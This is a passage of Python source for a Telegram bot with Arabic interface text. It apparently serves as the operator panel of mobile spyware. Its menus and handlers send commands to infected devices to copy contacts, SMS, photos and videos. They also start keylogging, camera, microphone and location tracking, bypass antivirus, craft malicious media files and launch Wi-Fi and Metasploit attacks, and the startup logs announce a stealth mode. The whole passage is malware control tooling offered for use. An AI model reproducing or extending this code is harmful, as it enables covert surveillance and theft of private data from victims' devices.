اختر العملية المطلوبة:
    """
    
    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_media_menu(message):
    """عرض قائمة الوسائط"""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    markup.add(
        telebot.types.InlineKeyboardButton("📸 الصور", callback_data="media_photos"),
        telebot.types.InlineKeyboardButton("🎥 الفيديوهات", callback_data="media_videos"),
        telebot.types.InlineKeyboardButton("🎵 الملفات الصوتية", callback_data="media_audio"),
        telebot.types.InlineKeyboardButton("📄 المستندات", callback_data="media_documents"),
        telebot.types.InlineKeyboardButton("📁 جميع الملفات", callback_data="media_all"),
        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
    )
    
    text = """
📁 **إدارة الوسائط**

اختر نوع الوسائط:
    """
    
    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_location_menu(message):
    """عرض قائمة الموقع"""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    markup.add(
        telebot.types.InlineKeyboardButton("📍 الموقع الحالي", callback_data="location_current"),
        telebot.types.InlineKeyboardButton("🗺️ تتبع الموقع", callback_data="location_track"),
        telebot.types.InlineKeyboardButton("📊 سجل المواقع", callback_data="location_history"),
        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
    )
    
    text = """
📍 **إدارة الموقع**

اختر العملية المطلوبة:
    """
    
    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_screenshot_menu(message):
    """عرض قائمة لقطة الشاشة"""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    markup.add(
        telebot.types.InlineKeyboardButton("📸 لقطة شاشة عادية", callback_data="screenshot_normal"),
        telebot.types.InlineKeyboardButton("📸 لقطة شاشة كاملة", callback_data="screenshot_full"),
        telebot.types.InlineKeyboardButton("📸 لقطة شاشة متسلسلة", callback_data="screenshot_series"),
        telebot.types.InlineKeyboardButton("📸 لقطة شاشة تلقائية", callback_data="screenshot_auto"),
        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
    )
    
    text = """
📸 **لقطة الشاشة**

اختر نوع اللقطة:
    """
    
    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_record_menu(message):
    """عرض قائمة تسجيل الكاميرا"""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    markup.add(
        telebot.types.InlineKeyboardButton("🎥 تسجيل الكاميرا الأمامية", callback_data="record_front"),
        telebot.types.InlineKeyboardButton("🎥 تسجيل الكاميرا الخلفية", callback_data="record_back"),
        telebot.types.InlineKeyboardButton("🎥 تسجيل متسلسل", callback_data="record_series"),
        telebot.types.InlineKeyboardButton("🎥 تسجيل تلقائي", callback_data="record_auto"),
        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
    )
    
    text = """
🎥 **تسجيل الكاميرا**

اختر نوع التسجيل:
    """
    
    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_mic_record_menu(message):
    """عرض قائمة تسجيل الميكروفون"""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    markup.add(
        telebot.types.InlineKeyboardButton("🎤 تسجيل قصير (30 ث)", callback_data="mic_record_30"),
        telebot.types.InlineKeyboardButton("🎤 تسجيل متوسط (2 د)", callback_data="mic_record_120"),
        telebot.types.InlineKeyboardButton("🎤 تسجيل طويل (5 د)", callback_data="mic_record_300"),
        telebot.types.InlineKeyboardButton("🎤 تسجيل تلقائي", callback_data="mic_record_auto"),
        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
    )
    
    text = """
🎤 **تسجيل الميكروفون**

اختر مدة التسجيل:
    """
    
    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_keylogger_menu(message):
    """عرض قائمة تسجيل المفاتيح"""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    markup.add(
        telebot.types.InlineKeyboardButton("⌨️ بدء التسجيل", callback_data="keylogger_start"),
        telebot.types.InlineKeyboardButton("⏹️ إيقاف التسجيل", callback_data="keylogger_stop"),
        telebot.types.InlineKeyboardButton("📊 عرض البيانات", callback_data="keylogger_data"),
        telebot.types.InlineKeyboardButton("🗑️ حذف البيانات", callback_data="keylogger_clear"),
        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
    )
    
    text = """
⌨️ **تسجيل المفاتيح**

اختر العملية المطلوبة:
    """
    
    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_advanced_attacks_menu(message):
    """عرض قائمة الهجمات المتقدمة"""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    markup.add(
        telebot.types.InlineKeyboardButton("📶 هجوم الواي فاي", callback_data="attack_wifi"),
        telebot.types.InlineKeyboardButton("📱 هجوم الأجهزة المحمولة", callback_data="attack_mobile"),
        telebot.types.InlineKeyboardButton("🔐 هجوم كسر التشفير", callback_data="attack_crypto"),
        telebot.types.InlineKeyboardButton("🌐 هجوم الويب", callback_data="attack_web"),
        telebot.types.InlineKeyboardButton("💉 هجوم الحقن", callback_data="attack_injection"),
        telebot.types.InlineKeyboardButton("🛡️ هجوم تجاوز الحماية", callback_data="attack_bypass"),
        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
    )
    
    text = """
🔨 **الهجمات المتقدمة**

اختر نوع الهجوم:
    """
    
    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_media_injection_menu(message):
    """عرض قائمة حقن الوسائط"""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    markup.add(
        telebot.types.InlineKeyboardButton("📸 حقن في الصور", callback_data="injection_images"),
        telebot.types.InlineKeyboardButton("🎥 حقن في الفيديوهات", callback_data="injection_videos"),
        telebot.types.InlineKeyboardButton("🎵 حقن في الصوت", callback_data="injection_audio"),
        telebot.types.InlineKeyboardButton("📄 حقن في المستندات", callback_data="injection_documents"),
        telebot.types.InlineKeyboardButton("💉 إنشاء وسائط خبيثة", callback_data="injection_create"),
        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
    )
    
    text = """
💉 **حقن الوسائط**

اختر نوع الحقن:
    """
    
    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_bypass_menu(message):
    """عرض قائمة تجاوز الحماية"""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    markup.add(
        telebot.types.InlineKeyboardButton("🛡️ تجاوز مضاد الفيروسات", callback_data="bypass_antivirus"),
        telebot.types.InlineKeyboardButton("🔥 تجاوز الجدار الناري", callback_data="bypass_firewall"),
        telebot.types.InlineKeyboardButton("🔍 تجاوز نظام الكشف", callback_data="bypass_ids"),
        telebot.types.InlineKeyboardButton("📦 تجاوز الحاوية", callback_data="bypass_sandbox"),
        telebot.types.InlineKeyboardButton("🔬 تجاوز التحليل", callback_data="bypass_analysis"),
        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
    )
    
    text = """
🛡️ **تجاوز الحماية**

اختر نوع التجاوز:
    """
    
    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_system_control_menu(message):
    """عرض قائمة التحكم في النظام"""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    markup.add(
        telebot.types.InlineKeyboardButton("⚙️ معلومات النظام", callback_data="system_info"),
        telebot.types.InlineKeyboardButton("🔄 إعادة تشغيل", callback_data="system_restart"),
        telebot.types.InlineKeyboardButton("🛑 إيقاف", callback_data="system_shutdown"),
        telebot.types.InlineKeyboardButton("📊 مراقبة الأداء", callback_data="system_monitor"),
        telebot.types.InlineKeyboardButton("🔧 إدارة العمليات", callback_data="system_processes"),
        telebot.types.InlineKeyboardButton("🌐 إدارة الشبكة", callback_data="system_network"),
        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
    )
    
    text = """
⚙️ **التحكم في النظام**

اختر العملية المطلوبة:
    """
    
    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_tools_menu(message):
    """عرض قائمة الأدوات المتقدمة"""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    markup.add(
        telebot.types.InlineKeyboardButton("🔧 Metasploit", callback_data="tool_metasploit"),
        telebot.types.InlineKeyboardButton("📱 ADB", callback_data="tool_adb"),
        telebot.types.InlineKeyboardButton("🔐 Hashcat", callback_data="tool_hashcat"),
        telebot.types.InlineKeyboardButton("📶 Aircrack", callback_data="tool_aircrack"),
        telebot.types.InlineKeyboardButton("💉 Payload Generator", callback_data="tool_payload"),
        telebot.types.InlineKeyboardButton("🛡️ Exploit Framework", callback_data="tool_exploit"),
        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
    )
    
    text = """
🔧 **الأدوات المتقدمة**

اختر الأداة المطلوبة:
    """
    
    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_stats_menu(message):
    """عرض قائمة الإحصائيات"""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    markup.add(
        telebot.types.InlineKeyboardButton("📊 إحصائيات الهجمات", callback_data="stats_attacks"),
        telebot.types.InlineKeyboardButton("📱 إحصائيات الأجهزة", callback_data="stats_devices"),
        telebot.types.InlineKeyboardButton("💾 إحصائيات البيانات", callback_data="stats_data"),
        telebot.types.InlineKeyboardButton("⚡ إحصائيات الأداء", callback_data="stats_performance"),
        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
    )
    
    text = """
📊 **الإحصائيات**

اختر نوع الإحصائيات:
    """
    
    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_help_menu(message):
    """عرض قائمة المساعدة"""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    markup.add(
        telebot.types.InlineKeyboardButton("📖 دليل الاستخدام", callback_data="help_guide"),
        telebot.types.InlineKeyboardButton("🔧 استكشاف الأخطاء", callback_data="help_troubleshoot"),
        telebot.types.InlineKeyboardButton("📞 الدعم الفني", callback_data="help_support"),
        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
    )
    
    text = """
❓ **المساعدة**

اختر ما تحتاج إليه:
    """
    
    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_settings_menu(message):
    """عرض قائمة الإعدادات"""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    markup.add(
        telebot.types.InlineKeyboardButton("🔒 إعدادات الأمان", callback_data="settings_security"),
        telebot.types.InlineKeyboardButton("⚙️ إعدادات النظام", callback_data="settings_system"),
        telebot.types.InlineKeyboardButton("📊 إعدادات المراقبة", callback_data="settings_monitoring"),
        telebot.types.InlineKeyboardButton("🌐 إعدادات الشبكة", callback_data="settings_network"),
        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="back_to_main")
    )
    
    text = """
⚙️ **الإعدادات**

اختر نوع الإعدادات:
    """
    
    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)

def handle_submenu_callback(call):
    """معالجة الأوامر الفرعية"""
    try:
        data = call.data
        
        if data.startswith("select_device_"):
            device_id = data.replace("select_device_", "")
            select_device_interactive(call.message, device_id)
        elif data.startswith("contacts_"):
            handle_contacts_callback(call)
        elif data.startswith("sms_"):
            handle_sms_callback(call)
        elif data.startswith("media_"):
            handle_media_callback(call)
        elif data.startswith("attack_"):
            handle_attack_callback(call)
        elif data.startswith("injection_"):
            handle_injection_callback(call)
        elif data.startswith("bypass_"):
            handle_bypass_callback(call)
        elif data.startswith("system_"):
            handle_system_callback(call)
        elif data.startswith("tool_"):
            handle_tool_callback(call)
        elif data.startswith("stats_"):
            handle_stats_callback(call)
        else:
            bot.answer_callback_query(call.id, "❌ أمر غير معروف")
            
    except Exception as e:
        bot.answer_callback_query(call.id, f"❌ خطأ: {str(e)}")
        logger.error(f"خطأ في معالجة الأوامر الفرعية: {e}")

def select_device_interactive(message, device_id):
    """اختيار جهاز تفاعلي"""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    markup.add(
        telebot.types.InlineKeyboardButton("📱 معلومات الجهاز", callback_data=f"device_info_{device_id}"),
        telebot.types.InlineKeyboardButton("📊 حالة الجهاز", callback_data=f"device_status_{device_id}"),
        telebot.types.InlineKeyboardButton("🔧 التحكم في الجهاز", callback_data=f"device_control_{device_id}"),
        telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="devices_menu")
    )
    
    text = f"""
📱 **الجهاز المحدد**

🆔 **معرف الجهاز:** `{device_id}`
⏰ **وقت الاختيار:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

اختر العملية المطلوبة:
    """
    
    bot.edit_message_text(text, message.chat.id, message.message_id, parse_mode='Markdown', reply_markup=markup)

def handle_contacts_callback(call):
    """معالجة أوامر جهات الاتصال"""
    data = call.data
    
    if data == "contacts_backup_all":
        # تنفيذ نسخ جميع جهات الاتصال
        device_id = get_selected_device(call.from_user.id)
        if device_id:
            result = command_executor.send_command(device_id, "backup_contacts", {"all": True})
            if result.get('success'):
                bot.answer_callback_query(call.id, "✅ تم نسخ جميع جهات الاتصال")
            else:
                bot.answer_callback_query(call.id, "❌ فشل في نسخ جهات الاتصال")
        else:
            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
    
    elif data == "contacts_search":
        # البحث في جهات الاتصال
        bot.answer_callback_query(call.id, "🔍 أدخل اسم جهة الاتصال للبحث")
    
    elif data == "contacts_stats":
        # إحصائيات جهات الاتصال
        device_id = get_selected_device(call.from_user.id)
        if device_id:
            result = command_executor.send_command(device_id, "contacts_stats", {})
            if result.get('success'):
                stats = result.get('data', {})
                text = f"""
📊 **إحصائيات جهات الاتصال**

📞 **إجمالي الجهات:** {stats.get('total', 0)}
👤 **جهات مع أرقام:** {stats.get('with_phone', 0)}
📧 **جهات مع إيميل:** {stats.get('with_email', 0)}
📅 **آخر تحديث:** {stats.get('last_update', 'غير متوفر')}
                """
                bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
            else:
                bot.answer_callback_query(call.id, "❌ فشل في جلب الإحصائيات")
        else:
            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")

def handle_sms_callback(call):
    """معالجة أوامر الرسائل"""
    data = call.data
    
    if data == "sms_backup_all":
        # نسخ جميع الرسائل
        device_id = get_selected_device(call.from_user.id)
        if device_id:
            result = command_executor.send_command(device_id, "backup_sms", {"all": True})
            if result.get('success'):
                bot.answer_callback_query(call.id, "✅ تم نسخ جميع الرسائل")
            else:
                bot.answer_callback_query(call.id, "❌ فشل في نسخ الرسائل")
        else:
            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
    
    elif data == "sms_inbox":
        # الرسائل الواردة
        device_id = get_selected_device(call.from_user.id)
        if device_id:
            result = command_executor.send_command(device_id, "backup_sms", {"type": "inbox"})
            if result.get('success'):
                bot.answer_callback_query(call.id, "✅ تم جلب الرسائل الواردة")
            else:
                bot.answer_callback_query(call.id, "❌ فشل في جلب الرسائل الواردة")
        else:
            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
    
    elif data == "sms_sent":
        # الرسائل الصادرة
        device_id = get_selected_device(call.from_user.id)
        if device_id:
            result = command_executor.send_command(device_id, "backup_sms", {"type": "sent"})
            if result.get('success'):
                bot.answer_callback_query(call.id, "✅ تم جلب الرسائل الصادرة")
            else:
                bot.answer_callback_query(call.id, "❌ فشل في جلب الرسائل الصادرة")
        else:
            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")

def handle_media_callback(call):
    """معالجة أوامر الوسائط"""
    data = call.data
    
    if data == "media_photos":
        # نسخ الصور
        device_id = get_selected_device(call.from_user.id)
        if device_id:
            result = command_executor.send_command(device_id, "backup_media", {"type": "photos"})
            if result.get('success'):
                bot.answer_callback_query(call.id, "✅ تم نسخ الصور")
            else:
                bot.answer_callback_query(call.id, "❌ فشل في نسخ الصور")
        else:
            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")
    
    elif data == "media_videos":
        # نسخ الفيديوهات
        device_id = get_selected_device(call.from_user.id)
        if device_id:
            result = command_executor.send_command(device_id, "backup_media", {"type": "videos"})
            if result.get('success'):
                bot.answer_callback_query(call.id, "✅ تم نسخ الفيديوهات")
            else:
                bot.answer_callback_query(call.id, "❌ فشل في نسخ الفيديوهات")
        else:
            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")

def handle_attack_callback(call):
    """معالجة أوامر الهجمات"""
    data = call.data
    
    if data == "attack_wifi":
        # هجوم الواي فاي
        markup = telebot.types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            telebot.types.InlineKeyboardButton("📶 Deauth Attack", callback_data="wifi_deauth"),
            telebot.types.InlineKeyboardButton("👻 Evil Twin", callback_data="wifi_evil_twin"),
            telebot.types.InlineKeyboardButton("🔐 Handshake Capture", callback_data="wifi_handshake"),
            telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="advanced_attacks_menu")
        )
        
        text = """
📶 **هجوم الواي فاي**

اختر نوع الهجوم:
        """
        
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
    
    elif data == "attack_mobile":
        # هجوم الأجهزة المحمولة
        markup = telebot.types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            telebot.types.InlineKeyboardButton("📱 Metasploit", callback_data="mobile_metasploit"),
            telebot.types.InlineKeyboardButton("🔧 ADB Attack", callback_data="mobile_adb"),
            telebot.types.InlineKeyboardButton("💉 Payload Injection", callback_data="mobile_payload"),
            telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="advanced_attacks_menu")
        )
        
        text = """
📱 **هجوم الأجهزة المحمولة**

اختر نوع الهجوم:
        """
        
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)

def handle_injection_callback(call):
    """معالجة أوامر الحقن"""
    data = call.data
    
    if data == "injection_images":
        # حقن في الصور
        markup = telebot.types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            telebot.types.InlineKeyboardButton("📸 رفع صورة", callback_data="injection_upload_image"),
            telebot.types.InlineKeyboardButton("💉 إنشاء صورة خبيثة", callback_data="injection_create_image"),
            telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="media_injection_menu")
        )
        
        text = """
📸 **حقن في الصور**

اختر العملية:
        """
        
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)

def handle_bypass_callback(call):
    """معالجة أوامر التجاوز"""
    data = call.data
    
    if data == "bypass_antivirus":
        # تجاوز مضاد الفيروسات
        device_id = get_selected_device(call.from_user.id)
        if device_id:
            result = command_executor.send_command(device_id, "bypass_antivirus", {})
            if result.get('success'):
                bot.answer_callback_query(call.id, "✅ تم تجاوز مضاد الفيروسات")
            else:
                bot.answer_callback_query(call.id, "❌ فشل في تجاوز مضاد الفيروسات")
        else:
            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")

def handle_system_callback(call):
    """معالجة أوامر النظام"""
    data = call.data
    
    if data == "system_info":
        # معلومات النظام
        device_id = get_selected_device(call.from_user.id)
        if device_id:
            result = command_executor.send_command(device_id, "system_info", {})
            if result.get('success'):
                info = result.get('data', {})
                text = f"""
⚙️ **معلومات النظام**

🖥️ **نظام التشغيل:** {info.get('os', 'غير متوفر')}
📱 **طراز الجهاز:** {info.get('model', 'غير متوفر')}
🔋 **البطارية:** {info.get('battery', 'غير متوفر')}%
💾 **الذاكرة:** {info.get('memory', 'غير متوفر')}
🌐 **الشبكة:** {info.get('network', 'غير متوفر')}
                """
                bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
            else:
                bot.answer_callback_query(call.id, "❌ فشل في جلب معلومات النظام")
        else:
            bot.answer_callback_query(call.id, "❌ لم يتم اختيار جهاز")

def handle_tool_callback(call):
    """معالجة أوامر الأدوات"""
    data = call.data
    
    if data == "tool_metasploit":
        # أداة Metasploit
        markup = telebot.types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            telebot.types.InlineKeyboardButton("🔧 تشغيل Metasploit", callback_data="metasploit_start"),
            telebot.types.InlineKeyboardButton("💉 إنشاء Payload", callback_data="metasploit_payload"),
            telebot.types.InlineKeyboardButton("🔍 البحث عن Exploits", callback_data="metasploit_search"),
            telebot.types.InlineKeyboardButton("⬅️ العودة", callback_data="tools_menu")
        )
        
        text = """
🔧 **أداة Metasploit**

اختر العملية:
        """
        
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)

def handle_stats_callback(call):
    """معالجة أوامر الإحصائيات"""
    data = call.data
    
    if data == "stats_attacks":
        # إحصائيات الهجمات
        text = """
📊 **إحصائيات الهجمات**

🔨 **إجمالي الهجمات:** 0
✅ **الهجمات الناجحة:** 0
❌ **الهجمات الفاشلة:** 0
📈 **معدل النجاح:** 0%

⏰ **آخر هجوم:** غير متوفر
🎯 **أفضل هجوم:** غير متوفر
        """
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')

# تشغيل البوت
if __name__ == "__main__":
    logger.info("🚀 بدء تشغيل بوت التحكم في الأجهزة...")
    logger.info("✅ تم تهيئة النظام بنجاح")
    logger.info("🔒 وضع الأمان مفعل")
    logger.info("💉 نظام حقن الوسائط المتقدم جاهز")
    logger.info("👻 وضع التخفي مفعل")
    logger.info("💾 التخزين المحلي مفعل")

    try:
        bot.polling(none_stop=True, interval=1, skip_pending=True, timeout=60)
    except Exception as e:
        logger.error(f"خطأ في تشغيل البوت: {e}")